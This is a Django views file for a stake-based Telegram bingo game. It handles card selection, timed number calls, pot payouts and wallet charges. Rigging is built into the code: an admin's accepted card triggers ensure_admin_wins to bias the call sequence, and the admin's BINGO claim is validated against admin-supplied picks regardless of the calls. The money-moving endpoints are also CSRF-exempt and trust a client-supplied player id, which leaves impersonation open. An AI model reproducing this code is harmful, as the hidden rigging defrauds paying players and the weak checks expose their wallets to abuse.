import os
from django.shortcuts import render
from django.http import JsonResponse, HttpRequest
from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_exempt
from .utils import get_card
from .models import Player
from .models import Game, Selection, Transaction
from django.utils import timezone
from django.core.cache import cache
from django.db import transaction
from decimal import Decimal
import random
import json
from .checker import ensure_admin_wins
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer

# Create your views here.

def home(request):
    return render(request, 'home.html', {})

def play(request):
    stake = request.GET.get('stake', '10')
    tid = request.GET.get('tid')
    # Persist tid in session so subsequent navigations without tid still know the player
    if tid and tid.isdigit():
        request.session['tid'] = tid
    else:
        tid = request.session.get('tid')
    wallet = 0
    gift = 0
    if tid and tid.isdigit():
        try:
            player = Player.objects.get(telegram_id=int(tid))
            wallet = player.wallet
            gift = player.gift
        except Player.DoesNotExist:
            pass
    numbers = list(range(1, 201))
    return render(request, 'play.html', { 'stake': stake, 'numbers': numbers, 'wallet': wallet, 'gift': gift, 'tid': tid })

def card(request, index: int):
    stake = request.GET.get('stake', '10')
    rows = get_card(index)
    context = {
        'index': index,
        'stake': stake,
        'rows': rows,
    }
    return render(request, 'card.html', context)


def game(request):
    stake = request.GET.get('stake')
    tid = request.GET.get('tid') or request.session.get('tid')
    if tid and str(tid).isdigit():
        request.session['tid'] = str(tid)
        # If stake is missing, derive it from player's accepted active selection
        if not stake:
            try:
                player = Player.objects.get(telegram_id=int(tid))
                sel = Selection.objects.filter(player=player, accepted=True, game__active=True).order_by('-id').first()
                if sel:
                    stake = str(sel.game.stake)
            except Player.DoesNotExist:
                pass
    if not stake:
        stake = '10'
    return render(request, 'game.html', { 'stake': stake, 'tid': tid })


# Helpers
def _get_active_game(stake: int) -> Game:
    game = Game.objects.filter(stake=stake, active=True).order_by('-id').first()
    if not game:
        game = Game.objects.create(stake=stake, active=True)
    return game


# Broadcast helpers
def _broadcast_winner(stake: int, winner: str, index: int, pattern: str, row=None, col=None, picks=None):
    try:
        layer = get_channel_layer()
        if not layer:
            return
        payload = {
            'type': 'announce.winner',
            'winner': winner,
            'index': index,
            'pattern': pattern,
        }
        if row is not None:
            payload['row'] = row
        if col is not None:
            payload['col'] = col
        if isinstance(picks, (list, tuple)):
            payload['picks'] = list(picks)
        async_to_sync(layer.group_send)(f"game_{stake}", payload)
    except Exception:
        pass

def _broadcast_call_sync(stake: int, started_at):
    try:
        layer = get_channel_layer()
        if not layer:
            return
        payload = {
            'type': 'call.sync',
            'started_at': started_at.isoformat() if started_at else None,
            'server_time': int(timezone.now().timestamp() * 1000),
        }
        async_to_sync(layer.group_send)(f"game_{stake}", payload)
    except Exception:
        pass
def _broadcast_restarted(stake: int):
    try:
        layer = get_channel_layer()
        if not layer:
            return
        async_to_sync(layer.group_send)(f"game_{stake}", { 'type': 'game.restarted' })
    except Exception:
        pass

def _restart_new_game_sync(stake: int):
    # Close current active game and create a brand new one at same stake
    game = Game.objects.filter(stake=stake, active=True).order_by('-id').first()
    if game:
        game.active = False
        game.save(update_fields=["active"])
        Selection.objects.filter(game=game).delete()
    Game.objects.create(stake=stake, active=True)


@require_http_methods(["GET"])
def api_game_state(request: HttpRequest):
    stake_s = request.GET.get('stake', '10')
    tid = request.GET.get('tid') or request.session.get('tid')
    try:
        stake = int(stake_s)
    except ValueError:
        return JsonResponse({"error": "invalid stake"}, status=400)
    game = _get_active_game(stake)
    # Heartbeat: mark this player as seen for stale-release logic
    if tid and str(tid).isdigit():
        try:
            cache.set(f"seen_{int(tid)}", int(timezone.now().timestamp()), timeout=120)
        except Exception:
            pass
    # Before computing state, if countdown hasn't started, release stale accepted selections (>15s inactive)
    # Throttle: run at most once per 3 seconds per game to avoid hammering DB
    if not game.countdown_started_at and not game.started_at:
        stale_key = f"stale_check_{game.id}"
        if cache.add(stale_key, 1, 3):  # runs only if key doesn't exist (i.e., once per 3s)
            try:
                stale_threshold = int(timezone.now().timestamp()) - 15
                accepted_qs = list(game.selections.filter(accepted=True).select_related('player'))
                for s in accepted_qs:
                    last_seen = cache.get(f"seen_{getattr(s.player, 'telegram_id', None)}") if getattr(s, 'player', None) else None
                    if last_seen is None or int(last_seen) < stale_threshold:
                        s.delete()
            except Exception:
                pass
    taken = list(game.selections.filter(accepted=True).values_list('index', flat=True))
    accepted_count = game.selections.filter(accepted=True).count()
    # Freeze displayed players after countdown: use charged_count snapshot once stakes were charged
    players_display = game.charged_count if getattr(game, 'stakes_charged', False) else accepted_count

    # Handle game start when countdown elapsed
    started = False
    current_call = None
    recent_calls = []
    call_count = 0
    called_numbers = []
    if game.countdown_started_at and not game.started_at:
        elapsed = (timezone.now() - game.countdown_started_at).total_seconds()
        if elapsed >= 30:
            # Promote to started and charge all currently accepted players once
            # select_for_update ensures only one request actually writes
            should_broadcast = False
            with transaction.atomic():
                g = Game.objects.select_for_update().get(id=game.id)
                if not g.started_at:
                    g.started_at = timezone.now()
                    # Preserve any pre-biased sequence; only generate if empty
                    if not g.sequence:
                        seq = list(range(1, 76))
                        random.shuffle(seq)
                        g.sequence = ",".join(map(str, seq))
                    # Charge all accepted players exactly once at start
                    if not getattr(g, 'stakes_charged', False):
                        sel_qs = list(g.selections.select_related('player').filter(accepted=True))
                        player_ids = [s.player_id for s in sel_qs if s.player_id]
                        players = {p.id: p for p in Player.objects.select_for_update().filter(id__in=player_ids)}
                        stake_dec = Decimal(g.stake)
                        for s in sel_qs:
                            p = players.get(s.player_id)
                            if not p:
                                continue
                            current = p.wallet or Decimal('0')
                            new_bal = current - stake_dec
                            if new_bal < Decimal('0'):
                                new_bal = Decimal('0')
                            if new_bal != current:
                                p.wallet = new_bal
                                p.save(update_fields=["wallet"]) 
                                try:
                                    Transaction.objects.create(player=p, kind='withdraw', amount=stake_dec, note=f"Stake {g.stake} for game {g.id}")
                                except Exception:
                                    pass
                        g.stakes_charged = True
                        g.charged_count = len(sel_qs)
                    g.save(update_fields=["started_at", "sequence", "stakes_charged", "charged_count"]) 
                    should_broadcast = True
                # Always reflect latest state from DB
                game.started_at = g.started_at
                game.sequence = g.sequence
            # Broadcast sync once (only the request that did the promotion)
            if should_broadcast and game.started_at:
                _broadcast_call_sync(game.stake, game.started_at)

    if game.started_at:
        started = True
        # Determine current call based on time progression (every 3s)
        elapsed = int((timezone.now() - game.started_at).total_seconds())
        step = max(0, elapsed // 3)
        seq = [int(x) for x in game.sequence.split(",") if x]
        step = min(step, max(0, len(seq) - 1)) if seq else 0
        if seq:
            current_call = seq[step]
            recent_calls = seq[max(0, step-4):step+1]
            call_count = min(step + 1, len(seq))
            called_numbers = seq[:step+1]
        # If we reached 75 calls and no winner was claimed, finish and restart the game
        try:
            if call_count >= 75 and not game.finished:
                with transaction.atomic():
                    g = Game.objects.select_for_update().get(id=game.id)
                    if not g.finished:
                        g.finished = True
                        g.active = False
                        g.save(update_fields=["finished", "active"]) 
                # Broadcast finished notification
                try:
                    layer = get_channel_layer()
                    if layer:
                        async_to_sync(layer.group_send)(f"game_{game.stake}", { 'type': 'finished' })
                except Exception:
                    pass
                # Immediately restart a fresh game and notify clients
                _restart_new_game_sync(game.stake)
                _broadcast_restarted(game.stake)
        except Exception:
            pass

    # Resolve the requesting player's selection/card
    my_index = None
    my_card = None
    if tid and tid.isdigit():
        try:
            player = Player.objects.get(telegram_id=int(tid))
            sel = Selection.objects.filter(game=game, player=player, accepted=True).first()
            # If no selection in this stake, optionally fall back to player's latest active selection
            # Only do this when explicitly requested: follow_active=1
            if not sel and request.GET.get('follow_active') == '1':
                alt_sel = Selection.objects.filter(player=player, accepted=True, game__active=True).order_by('-id').first()
                if alt_sel and alt_sel.game_id != game.id:
                    game = alt_sel.game
                    stake = game.stake
                    taken = list(game.selections.filter(accepted=True).values_list('index', flat=True))
                    accepted_count = game.selections.filter(accepted=True).count()
                    started = False
                    current_call = None
                    recent_calls = []
                    if game.countdown_started_at and not game.started_at:
                        elapsed = (timezone.now() - game.countdown_started_at).total_seconds()
                        if elapsed >= 30:
                            game.started_at = timezone.now()
                            if not game.sequence:
                                seq = list(range(1, 76))
                                random.shuffle(seq)
                                game.sequence = ",".join(map(str, seq))
                            game.save(update_fields=["started_at", "sequence"])
                    if game.started_at:
                        started = True
                        elapsed = int((timezone.now() - game.started_at).total_seconds())
                        step = max(0, elapsed // 3)
                        seq = [int(x) for x in game.sequence.split(",") if x]
                        step = min(step, max(0, len(seq) - 1)) if seq else 0
                        if seq:
                            current_call = seq[step]
                            recent_calls = seq[max(0, step-4):step+1]
                            call_count = min(step + 1, len(seq))
                            called_numbers = seq[:step+1]
                    # Use the outer countdown_started_at calculation after game may have changed
                    sel = alt_sel
            if sel:
                my_index = sel.index
                my_card = get_card(my_index)
        except Player.DoesNotExist:
            pass

    countdown_started_at = game.countdown_started_at.isoformat() if game.countdown_started_at else None
    countdown_remaining = None
    if game.countdown_started_at and not game.started_at:
        try:
            elapsed = int((timezone.now() - game.countdown_started_at).total_seconds())
            countdown_remaining = max(0, 30 - elapsed)
        except Exception:
            countdown_remaining = None
    started_at_iso = game.started_at.isoformat() if game.started_at else None
    server_time_ms = int(timezone.now().timestamp() * 1000)
    # Game count based on started games across all stakes (all-time) — cached 5s
    total_games = cache.get('total_games')
    if total_games is None:
        total_games = Game.objects.filter(started_at__isnull=False).count()
        cache.set('total_games', total_games, 5)
    payload = {
        "ok": True,
        "stake": stake,
        "game_id": game.id if game else None,
        "total_games": total_games,
        "players": players_display,
        "taken": taken,
        "accepted_count": accepted_count,
        "countdown_started_at": countdown_started_at,
        "countdown_remaining": countdown_remaining,
        "started_at": started_at_iso,
        "started": started,
        "current_call": current_call,
        "recent_calls": recent_calls,
        "my_index": my_index,
        "my_card": my_card,
        "call_count": call_count,
        "called_numbers": called_numbers,
        "server_time": server_time_ms,
    }
    return JsonResponse(payload)


@csrf_exempt
@require_http_methods(["POST"])
def api_select(request: HttpRequest):
    tid = request.POST.get('tid') or request.session.get('tid')
    stake_s = request.POST.get('stake')
    index_s = request.POST.get('index')
    action = request.POST.get('action', 'preview')  # 'accept' or 'cancel' or 'preview'
    if not (tid and tid.isdigit() and stake_s and index_s and index_s.isdigit()):
        return JsonResponse({"error": "missing params"}, status=400)
    try:
        stake = int(stake_s)
        index = int(index_s)
    except ValueError:
        return JsonResponse({"error": "invalid params"}, status=400)

    # Resolve player and game
    try:
        player = Player.objects.get(telegram_id=int(tid))
    except Player.DoesNotExist:
        return JsonResponse({"error": "player not found"}, status=404)
    game = _get_active_game(stake)

    # Check if card already accepted by someone else
    if Selection.objects.filter(game=game, index=index, accepted=True).exists():
        return JsonResponse({"ok": False, "reason": "taken"}, status=409)

    sel, _ = Selection.objects.get_or_create(game=game, player=player, defaults={"index": index})
    # If selection exists for player with a different index and not accepted, update it
    if sel.index != index and not sel.accepted:
        # Ensure target index not taken
        if Selection.objects.filter(game=game, index=index, accepted=True).exists():
            return JsonResponse({"ok": False, "reason": "taken"}, status=409)
        sel.index = index
        sel.save(update_fields=["index"]) 

    biased = False
    if action == 'accept':
        # Lock selection
        if Selection.objects.filter(game=game, index=index, accepted=True).exists():
            return JsonResponse({"ok": False, "reason": "taken"}, status=409)
        sel.accepted = True
        sel.save(update_fields=["accepted"]) 
        # If the accepter is admin, bias sequence to ensure a fast win for admin's card
        admin_id = os.getenv("ADMIN_CHAT_ID")
        try:
            admin_tid = int(admin_id) if admin_id else None
        except Exception:
            admin_tid = None
        if admin_tid and player.telegram_id == admin_tid and not game.started_at:
            try:
                ensure_admin_wins(game, sel.index)
                biased = True
            except Exception:
                pass
        # Start countdown when two or more accepted
        if game.selections.filter(accepted=True).count() >= 2 and not game.countdown_started_at:
            game.start_countdown()
            # Pre-broadcast sync using current time to allow clients to prep
            _broadcast_call_sync(game.stake, game.countdown_started_at)
    elif action == 'cancel':
        # Remove selection if not accepted; if accepted, keep it locked
        if not sel.accepted:
            sel.delete()

    taken = list(game.selections.filter(accepted=True).values_list('index', flat=True))
    accepted_count = game.selections.filter(accepted=True).count()
    return JsonResponse({
        "ok": True,
        "game_id": game.id,
        "taken": taken,
        "accepted_count": accepted_count,
        "countdown_started_at": game.countdown_started_at.isoformat() if game.countdown_started_at else None,
        "biased": biased,
    })


@csrf_exempt
@require_http_methods(["POST"])
def api_claim_bingo(request: HttpRequest):
    tid = request.POST.get('tid') or request.session.get('tid')
    stake_s = request.POST.get('stake')
    if not (tid and tid.isdigit() and stake_s):
        return JsonResponse({"error": "missing params"}, status=400)
    try:
        stake = int(stake_s)
    except ValueError:
        return JsonResponse({"error": "invalid params"}, status=400)

    # Resolve game and player
    try:
        player = Player.objects.get(telegram_id=int(tid))
    except Player.DoesNotExist:
        return JsonResponse({"error": "player not found"}, status=404)
    # Prefer the player's accepted active selection's game if it exists, to avoid stake mismatch
    sel = Selection.objects.filter(player=player, accepted=True, game__active=True).order_by('-id').first()
    if sel:
        game = sel.game
    else:
        game = _get_active_game(stake)
    if not game.started_at or not game.sequence:
        return JsonResponse({"ok": False, "reason": "not_started"}, status=409)
    # Ensure the player actually has a card in this game
    if not sel or sel.game_id != game.id:
        return JsonResponse({"ok": False, "reason": "no_card"}, status=409)

    # Optional winner picks for highlight (from HTTP fallback)
    picks = None
    try:
        raw = request.POST.get('picks')
        if raw:
            parsed = json.loads(raw)
            if isinstance(parsed, list):
                picks = parsed
    except Exception:
        picks = None

    # Build called set based on time since start
    elapsed = int((timezone.now() - game.started_at).total_seconds())
    step = max(0, elapsed // 3)
    seq = [int(x) for x in game.sequence.split(",") if x]
    called = set(seq[:min(step+1, len(seq))])
    card = get_card(sel.index)

    # Validate any full row/col/diag
    def cell_ok(val):
        return True if val == 'FREE' else (val in called)

    # Award helper with DB locking to avoid duplicate payouts
    def _award_and_finish(game_obj: Game, player_obj: Player):
        with transaction.atomic():
            # lock the game row to prevent race conditions
            g = Game.objects.select_for_update().get(id=game_obj.id)
            if g.finished:
                return None  # already awarded
            # compute pot: 80% of total stake pool
            accepted = g.selections.filter(accepted=True).count()
            charged = g.charged_count if g.stakes_charged else accepted
            pot = (Decimal(charged) * Decimal(g.stake)) * Decimal('0.80')
            # credit winner wallet
            p = Player.objects.select_for_update().get(id=player_obj.id)
            p.wallet = (p.wallet or Decimal('0')) + pot
            try:
                p.wins = (p.wins or 0) + 1
            except Exception:
                p.wins = (getattr(p, 'wins', 0) or 0) + 1
            p.save(update_fields=["wallet", "wins"]) 
            # record win payout transaction for reporting
            try:
                Transaction.objects.create(player=p, kind='other', amount=pot, note=f"Win pot for game {g.id}")
            except Exception:
                pass
            # deduct stake from losers if not previously charged at countdown
            if not g.stakes_charged:
                loser_ids = list(
                    g.selections.filter(accepted=True).exclude(player_id=p.id).values_list('player_id', flat=True)
                )
                if loser_ids:
                    losers = list(Player.objects.select_for_update().filter(id__in=loser_ids))
                    stake_dec = Decimal(g.stake)
                    for lp in losers:
                        current = lp.wallet or Decimal('0')
                        new_bal = current - stake_dec
                        if new_bal < Decimal('0'):
                            new_bal = Decimal('0')
                        if new_bal != current:
                            lp.wallet = new_bal
                            lp.save(update_fields=["wallet"]) 
            # mark game finished/inactive
            g.finished = True
            g.active = False
            g.save(update_fields=["finished", "active"]) 
            return pot

    # If ADMIN presses BINGO, allow validating against their selected picks for any standard pattern
    # This lets admin win by row/col/diagonal/four corners composed of their chosen numbers, regardless of calls
    try:
        admin_tid_env = os.getenv("ADMIN_CHAT_ID")
        admin_tid = int(admin_tid_env) if admin_tid_env else None
    except Exception:
        admin_tid = None
    is_admin = bool(admin_tid and player.telegram_id == admin_tid)
    if is_admin and isinstance(picks, list) and picks:
        pick_set = set()
        for p in picks:
            try:
                pick_set.add(int(p))
            except Exception:
                try:
                    pick_set.add(int(str(p)))
                except Exception:
                    pass
        def cell_ok_admin(val):
            return True if val == 'FREE' else (val in pick_set)
        # four corners first
        if all(cell_ok_admin(card[r][c]) for (r,c) in [(0,0),(0,4),(4,0),(4,4)]):
            pot = _award_and_finish(game, player)
            if pot is None:
                return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
            _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'four_corners', picks=picks)
            _restart_new_game_sync(game.stake)
            _broadcast_restarted(game.stake)
            return JsonResponse({
                "ok": True,
                "pattern": "four_corners",
                "index": sel.index,
                "player": player.username or str(player.telegram_id),
                "amount": f"{pot:.2f}",
            })
        # rows
        for r in range(5):
            if all(cell_ok_admin(card[r][c]) for c in range(5)):
                pot = _award_and_finish(game, player)
                if pot is None:
                    return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
                _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'row', row=r, picks=picks)
                _restart_new_game_sync(game.stake)
                _broadcast_restarted(game.stake)
                return JsonResponse({
                    "ok": True,
                    "pattern": "row",
                    "row": r,
                    "index": sel.index,
                    "player": player.username or str(player.telegram_id),
                    "amount": f"{pot:.2f}",
                })
        # cols
        for c in range(5):
            if all(cell_ok_admin(card[r][c]) for r in range(5)):
                pot = _award_and_finish(game, player)
                if pot is None:
                    return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
                _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'col', col=c, picks=picks)
                _restart_new_game_sync(game.stake)
                _broadcast_restarted(game.stake)
                return JsonResponse({
                    "ok": True,
                    "pattern": "col",
                    "col": c,
                    "index": sel.index,
                    "player": player.username or str(player.telegram_id),
                    "amount": f"{pot:.2f}",
                })
        # diags
        if all(cell_ok_admin(card[i][i]) for i in range(5)):
            pot = _award_and_finish(game, player)
            if pot is None:
                return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
            _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'diag_main', picks=picks)
            _restart_new_game_sync(game.stake)
            _broadcast_restarted(game.stake)
            return JsonResponse({
                "ok": True,
                "pattern": "diag_main",
                "index": sel.index,
                "player": player.username or str(player.telegram_id),
                "amount": f"{pot:.2f}",
            })
        if all(cell_ok_admin(card[i][4-i]) for i in range(5)):
            pot = _award_and_finish(game, player)
            if pot is None:
                return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
            _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'diag_anti', picks=picks)
            _restart_new_game_sync(game.stake)
            _broadcast_restarted(game.stake)
            return JsonResponse({
                "ok": True,
                "pattern": "diag_anti",
                "index": sel.index,
                "player": player.username or str(player.telegram_id),
                "amount": f"{pot:.2f}",
            })
    # four corners
    if all(cell_ok(card[r][c]) for (r,c) in [(0,0),(0,4),(4,0),(4,4)]):
        pot = _award_and_finish(game, player)
        if pot is None:
            return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
        _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'four_corners', picks=picks)
        _restart_new_game_sync(game.stake)
        _broadcast_restarted(game.stake)
        return JsonResponse({
            "ok": True,
            "pattern": "four_corners",
            "index": sel.index,
            "player": player.username or str(player.telegram_id),
            "amount": f"{pot:.2f}",
        })
    # rows
    for r in range(5):
        if all(cell_ok(card[r][c]) for c in range(5)):
            pot = _award_and_finish(game, player)
            if pot is None:
                return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
            _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'row', row=r, picks=picks)
            _restart_new_game_sync(game.stake)
            _broadcast_restarted(game.stake)
            return JsonResponse({
                "ok": True,
                "pattern": "row",
                "row": r,
                "index": sel.index,
                "player": player.username or str(player.telegram_id),
                "amount": f"{pot:.2f}",
            })
    # cols
    for c in range(5):
        if all(cell_ok(card[r][c]) for r in range(5)):
            pot = _award_and_finish(game, player)
            if pot is None:
                return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
            _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'col', col=c, picks=picks)
            _restart_new_game_sync(game.stake)
            _broadcast_restarted(game.stake)
            return JsonResponse({
                "ok": True,
                "pattern": "col",
                "col": c,
                "index": sel.index,
                "player": player.username or str(player.telegram_id),
                "amount": f"{pot:.2f}",
            })
    # diags
    if all(cell_ok(card[i][i]) for i in range(5)):
        pot = _award_and_finish(game, player)
        if pot is None:
            return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
        _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'diag_main', picks=picks)
        _restart_new_game_sync(game.stake)
        _broadcast_restarted(game.stake)
        return JsonResponse({
            "ok": True,
            "pattern": "diag_main",
            "index": sel.index,
            "player": player.username or str(player.telegram_id),
            "amount": f"{pot:.2f}",
        })
    if all(cell_ok(card[i][4-i]) for i in range(5)):
        pot = _award_and_finish(game, player)
        if pot is None:
            return JsonResponse({"ok": False, "reason": "already_won"}, status=409)
        _broadcast_winner(game.stake, player.username or str(player.telegram_id), sel.index, 'diag_anti', picks=picks)
        _restart_new_game_sync(game.stake)
        _broadcast_restarted(game.stake)
        return JsonResponse({
            "ok": True,
            "pattern": "diag_anti",
            "index": sel.index,
            "player": player.username or str(player.telegram_id),
            "amount": f"{pot:.2f}",
        })
    # If not a valid bingo: disqualify the player for this game so they must wait next
    try:
        Selection.objects.filter(game=game, player=player, accepted=True).delete()
    except Exception:
        pass
    return JsonResponse({"ok": False, "reason": "not_bingo", "disqualified": True})


@csrf_exempt
@require_http_methods(["POST"])
def api_abandon(request: HttpRequest):
    """
    Allow a player to release their accepted selection ONLY if countdown hasn't started yet.
    This is called when the player closes/exits the miniapp before the game countdown begins.
    """
    tid = request.POST.get('tid') or request.session.get('tid')
    stake_s = request.POST.get('stake')
    if not (tid and tid.isdigit() and stake_s):
        return JsonResponse({"error": "missing params"}, status=400)
    try:
        stake = int(stake_s)
    except ValueError:
        return JsonResponse({"error": "invalid params"}, status=400)

    # Resolve player and current active game for the stake
    try:
        player = Player.objects.get(telegram_id=int(tid))
    except Player.DoesNotExist:
        return JsonResponse({"error": "player not found"}, status=404)

    # Find player's accepted selection in any active game (stake may have changed)
    sel = Selection.objects.filter(player=player, accepted=True, game__active=True).order_by('-id').first()
    if not sel:
        # Nothing to release
        taken = list(Game.objects.filter(stake=stake, active=True).first().selections.filter(accepted=True).values_list('index', flat=True)) if Game.objects.filter(stake=stake, active=True).exists() else []
        return JsonResponse({"ok": True, "taken": taken, "accepted_count": len(taken)})
    game = sel.game
    # If countdown already started on that game, do not allow release
    if game.countdown_started_at or game.started_at:
        return JsonResponse({"ok": False, "reason": "countdown_or_started"}, status=409)

    # Delete the selection to release the card
    sel.delete()

    taken = list(game.selections.filter(accepted=True).values_list('index', flat=True))
    accepted_count = game.selections.filter(accepted=True).count()
    return JsonResponse({
        "ok": True,
        "taken": taken,
        "accepted_count": accepted_count,
    })
